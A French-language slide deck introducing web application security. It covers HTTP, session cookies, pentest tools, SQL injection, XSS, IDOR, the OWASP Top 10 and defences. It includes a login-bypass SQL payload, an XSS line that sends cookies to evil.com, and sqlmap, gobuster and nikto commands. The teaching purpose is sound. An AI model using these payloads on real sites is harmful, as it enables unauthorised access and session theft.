// 01 · Le modèle Web

Comment fonctionne une application web ?

🌐 ARCHITECTURE
  • Client — ton navigateur envoie des requêtes HTTP
  • Serveur Web — Apache, Nginx traite les requêtes
  • Application — PHP, Python, Node.js génère la réponse
  • Base de données — MySQL, PostgreSQL stocke les données
🔄 FLUX D'UNE REQUÊTE
Browser → GET /login HTTP/1.1
Server → 200 OK + HTML
Browser → POST /login (user+pass)
Server → 302 Redirect /dashboard
💡 Chaque interaction est une potentielle surface d'attaque
// 02 · HTTP & HTTPS

HTTP — Le protocole du Web

📋 MÉTHODES HTTP
  • GET — récupère une ressource (params dans l'URL)
  • POST — envoie des données (formulaires, login)
  • PUT / PATCH — modifie une ressource
  • DELETE — supprime une ressource
⚠️ GET = visible dans l'URL → jamais de mot de passe en GET !
🔐 COOKIES & SESSIONS
  • Le serveur crée une session après authentification
  • Un cookie stocke l'ID de session dans le navigateur
  • Voler ce cookie = usurper l'identité de l'utilisateur
  • Flag HttpOnly protège contre le vol par XSS
Set-Cookie: session=abc123; HttpOnly; Secure
// 03 · Outils

Les outils du hacker web

🔬
BURP SUITE
Proxy HTTP qui intercepte et modifie les requêtes en temps réel. Standard de l'industrie pour les pentests web.
Intercept · Repeater · Intruder · Scanner
🛠️
DEV TOOLS (F12)
Intégré au navigateur. Network pour voir les requêtes, Console pour JavaScript, Storage pour les cookies et localStorage.
Network · Console · Sources · Application
📡
OWASP ZAP
Alternative open source à Burp Suite. Scanner automatique de vulnérabilités. Idéal pour débuter.
100% gratuit · Open Source
💉
SQLMAP
Automatise la détection et l'exploitation des injections SQL. Teste tous les paramètres d'une URL.
sqlmap -u "http://target.com?id=1"
🔍
DIRB / GOBUSTER
Découvre les répertoires et fichiers cachés sur un serveur web. Trouve /admin, /backup, /config...
gobuster dir -u http://target -w wordlist
🌐
NIKTO
Scanner de vulnérabilités serveur. Détecte configs dangereuses, fichiers exposés, versions obsolètes.
nikto -h http://target.com
// 04 · SQL Injection

Injection SQL — La reine des vulnérabilités

🎯 COMMENT ÇA MARCHE
Le code SQL de la requête est construit avec des données utilisateur non filtrées.
Requête normale :
SELECT * FROM users WHERE user='admin' AND pass='1234'

Payload injecté : ' OR '1'='1
SELECT * FROM users WHERE user='admin' AND pass='' OR '1'='1'
→ TOUJOURS VRAI = ACCÈS ACCORDÉ !
💥 IMPACTS POSSIBLES
  • Contourner l'authentification (login sans mot de passe)
  • Lire toute la base de données (mots de passe, données clients)
  • Modifier ou supprimer des données
  • Exécuter des commandes sur le serveur (RCE)
PRÉVENTION
  • Requêtes préparées (prepared statements)
  • ORM (Sequelize, Django ORM)
  • Validation et filtrage des entrées
// 05 · XSS

Cross-Site Scripting (XSS)

🎭 DÉFINITION
Injection de code JavaScript malveillant dans une page web consultée par d'autres utilisateurs.
Payload XSS :
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
→ Vol de cookies de session → Usurpation d'identité
📊 3 TYPES DE XSS
  • Reflected — payload dans l'URL, exécuté une fois
    ?search=<script>alert(1)</script>
  • Stored — payload en base de données, exécuté à chaque visite
    Le plus dangereux — commentaires, profils
  • DOM-based — manipulation du DOM côté client
    Pas de serveur impliqué
PRÉVENTION
  • Échapper les caractères HTML (< > " ')
  • Content Security Policy (CSP) header
// 06 · OWASP Top 10

OWASP Top 10 — Les vulnérabilités les plus critiques

A01 — Broken Access Control
Accès à des ressources sans autorisation. Ex: voir les données d'un autre utilisateur en changeant l'ID dans l'URL.
A02 — Cryptographic Failures
Données sensibles transmises ou stockées sans chiffrement. Mots de passe en MD5, HTTP sans TLS.
A03 — Injection (SQLi, XSS...)
Données non filtrées interprétées comme du code. SQL, commandes shell, LDAP, XML...
A04 — Insecure Design
Failles de conception architecturale. Absence de rate-limiting, logique métier exploitable.
A05 — Security Misconfiguration
Config par défaut non changée, ports inutiles ouverts, messages d'erreur verbeux.
A07 — Authentication Failures
Pas de MFA, sessions sans expiration, mots de passe faibles autorisés.
→ Source : owasp.org · Référence mondiale pour la sécurité web
// 07 · Broken Access Control

IDOR — Insecure Direct Object Reference

🎯 C'EST QUOI
Un IDOR permet d'accéder aux données d'un autre utilisateur en modifiant simplement un identifiant dans l'URL ou la requête.
URL normale :
https://bank.ga/account?id=1042

IDOR :
https://bank.ga/account?id=1043
→ Accès aux données du compte 1043 !
📊 IMPACT & PRÉVENTION
  • Lecture des données de n'importe quel utilisateur
  • Modification des commandes, profils, paramètres d'autrui
  • Téléchargement de fichiers privés
CORRECTIONS
  • Vérifier côté serveur que l'utilisateur a le droit d'accéder à la ressource
  • Utiliser des UUID non prédictibles plutôt que des IDs séquentiels
  • Implémenter un contrôle d'accès basé sur les rôles (RBAC)
// 08 · Méthodologie Pentest Web

Comment tester une application web ?

01
RECONNAISSANCE
Identifier la technologie (Wappalyzer), lister les endpoints, mapper les fonctionnalités
02
AUTHENTIFICATION
Tester le login (brute force, SQLi), analyser les cookies de session, vérifier le MFA
03
ENTRÉES UTILISATEUR
Tester chaque input (SQLi, XSS, CSRF), les uploads de fichiers, les paramètres cachés
04
CONTRÔLE D'ACCÈS
Tester les IDOR, accès horizontal/vertical, endpoints admin non protégés
05
RAPPORT
Documenter chaque vulnérabilité : description, impact, preuve (PoC), recommandations
// 09 · Défense Web

Comment sécuriser une application web ?

🛡️ DÉVELOPPEMENT SÉCURISÉ
  • Valider toutes les entrées côté serveur (pas seulement client)
  • Prepared statements pour toutes les requêtes SQL
  • Encoder les sorties HTML (pas de innerHTML avec data user)
  • Principe du moindre privilège en base de données
⚙️ CONFIGURATION SERVEUR
  • HTTPS obligatoire + HSTS header
  • CSP (Content Security Policy) pour bloquer le XSS
  • WAF (Web Application Firewall)
  • Mise à jour régulière des dépendances et frameworks
  • Logs et monitoring des accès anormaux
